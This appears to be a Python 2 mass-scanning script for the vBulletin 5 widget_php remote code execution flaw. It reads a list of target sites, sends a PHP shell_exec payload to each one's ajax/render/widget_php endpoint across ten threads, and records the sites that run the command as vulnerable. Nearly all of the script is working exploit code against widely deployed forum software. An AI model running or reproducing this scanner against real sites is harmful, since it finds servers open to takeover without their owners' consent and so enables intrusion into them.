import requests
import json
import Queue
import threading
class Bruter(object):
	def __init__(self, urls,threads):

		self.vb_urls = Queue.Queue()
		self.threads = threads
		for u in urls:
			self.vb_urls.put(u[0])
		#print self.vb_urls.get()
	def vb5_rce(self):
		with threading.Lock():
			while self.vb_urls.qsize() > 0:

				target = self.vb_urls.get()
				if 'http' not in target:
					target = 'http://'+target
				url = target+"/index.php?routestring=ajax/render/widget_php"
				headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.2.14", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
				data = {"widgetConfig[code]": "echo shell_exec('echo boogle'); exit;"}
				
				try:
					res = requests.post(url, headers=headers, data=data)
					if 'boogle' in res.text and 'exit' not in res.text:
						print '[+] '+ target +' is vuluable '
						file_write(r'vb5_vulu_site.txt',target+'\n')

					else:
						print '[-] '+ target +' is not vuluable '
				except:
					print '[!] '+ target +' error '
					pass

	def run(self):
		for i in  range(self.threads):
			print '[+] thread '+ str(i)
			t = threading.Thread(target=self.vb5_rce)
			t.start()
def get_url():
	with open(sys.argv[1],'r')  as f:
		r = json.loads(f.read())
		urls = r['results']
		return urls
		
def file_write(name,results):
    with open(name,mode='a') as file:
        file.write(results)

if __name__ == '__main__':
	if len(sys.argv) != 2:
    	sys.exit("Usage: %s <sitelist.txt>" % sys.argv[0])

	urls = get_url()
	vb5_rce = Bruter(urls=urls,threads=10)
	vb5_rce.run()